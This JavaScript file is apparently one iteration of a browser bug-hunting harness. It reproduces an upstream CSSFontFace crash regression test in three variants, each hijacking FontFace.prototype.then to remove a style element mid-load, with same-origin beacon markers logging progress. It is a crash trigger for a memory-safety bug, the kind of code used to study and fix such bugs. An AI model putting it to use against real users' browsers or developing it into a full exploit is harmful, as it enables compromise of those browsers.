/*
 * p447: the upstream CSSFontFace regression test, run faithfully.
 *
 * p446 ran and did not crash, but its getter removed an element that did not
 * exist on the page, so it re-entered without changing the document. The
 * upstream test (LayoutTests/fonts/font-face-load-crash.html) removes a style
 * element that is really there, which is what forces the style recalc that
 * detaches a client during iteration.
 *
 * Three triggers, each with its own marker, each removing a real element:
 *
 *   A  the upstream test verbatim: a <style id="v"> in the document, an
 *      @font-face appended in a second style element, the face looked up in
 *      document.fonts, face.loaded read first, then a .then getter on
 *      FontFace.prototype that removes #v and forces layout, then face.load().
 *   B  the same, but the getter removes the style element that carries the
 *      @font-face rule itself, so the client is removed at its source.
 *   C  A with a second face in the set, so the loop has a client after the one
 *      that disappears.
 */
(function () {
    var s = 'ff';
    try {
        s = sessionStorage.getItem('v172s') || Math.random().toString(36).slice(2, 8);
        sessionStorage.setItem('v172s', s);
    } catch (e) {}

    function mark(tag) {
        var url = location.origin + '/beacon/V172-' + s + '-' + tag + '?t=' + Date.now();
        try {
            var x = new XMLHttpRequest();
            x.open('GET', url, false);
            x.send();
        } catch (e) {
            try { navigator.sendBeacon(url); } catch (e2) {}
        }
    }

    mark('BEFORE-fontface2');
    if (typeof FontFace === 'undefined' || !document.fonts) { mark('API-no'); return; }

    function makeFace(family, styleId) {
        var st = document.createElement('style');
        if (styleId) st.id = styleId;
        st.textContent = '@font-face { font-family: ' + family + '; src: local(Helvetica); }';
        document.head.appendChild(st);
        document.body.offsetHeight;
        var face = null;
        document.fonts.forEach(function (f) {
            if (f.family && f.family.replace(/['"]/g, '') === family) face = f;
        });
        return face;
    }

    // A - upstream, verbatim.
    try {
        var v = document.createElement('style');
        v.id = 'v';
        v.textContent = 'x{}';
        document.head.appendChild(v);
        document.body.offsetHeight;

        var faceA = makeFace('ffA');
        mark('A-FACE-' + (faceA ? 'found' : 'missing'));
        if (faceA) {
            var loadedA = faceA.loaded;
            var firedA = 0;
            Object.defineProperty(FontFace.prototype, 'then', {
                get: function () {
                    firedA++;
                    var t = document.getElementById('v');
                    if (t) t.remove();
                    document.body.offsetHeight;
                    return undefined;
                },
                configurable: true
            });
            faceA.load();
            mark('A-DONE-then=' + firedA);
            delete FontFace.prototype.then;
        }
    } catch (e) {
        mark('A-ERR-' + e);
    }

    // B - the getter removes the face's own style element.
    try {
        var faceB = makeFace('ffB', 'vb');
        mark('B-FACE-' + (faceB ? 'found' : 'missing'));
        if (faceB) {
            var loadedB = faceB.loaded;
            var firedB = 0;
            Object.defineProperty(FontFace.prototype, 'then', {
                get: function () {
                    firedB++;
                    var t = document.getElementById('vb');
                    if (t) t.remove();
                    document.body.offsetHeight;
                    return undefined;
                },
                configurable: true
            });
            faceB.load();
            mark('B-DONE-then=' + firedB);
            delete FontFace.prototype.then;
        }
    } catch (e) {
        mark('B-ERR-' + e);
    }

    // C - two faces, so a client remains after the removed one.
    try {
        var faceC1 = makeFace('ffC1');
        var faceC2 = makeFace('ffC2', 'vc2');
        mark('C-FACES-' + (faceC1 ? 1 : 0) + (faceC2 ? 1 : 0));
        if (faceC1 && faceC2) {
            var loadedC = faceC1.loaded;
            var firedC = 0;
            Object.defineProperty(FontFace.prototype, 'then', {
                get: function () {
                    firedC++;
                    var t = document.getElementById('vc2');
                    if (t) t.remove();
                    document.body.offsetHeight;
                    return undefined;
                },
                configurable: true
            });
            faceC1.load();
            faceC2.load();
            mark('C-DONE-then=' + firedC);
            delete FontFace.prototype.then;
        }
    } catch (e) {
        mark('C-ERR-' + e);
    }

    setTimeout(function () { mark('DONE'); }, 1200);
})();
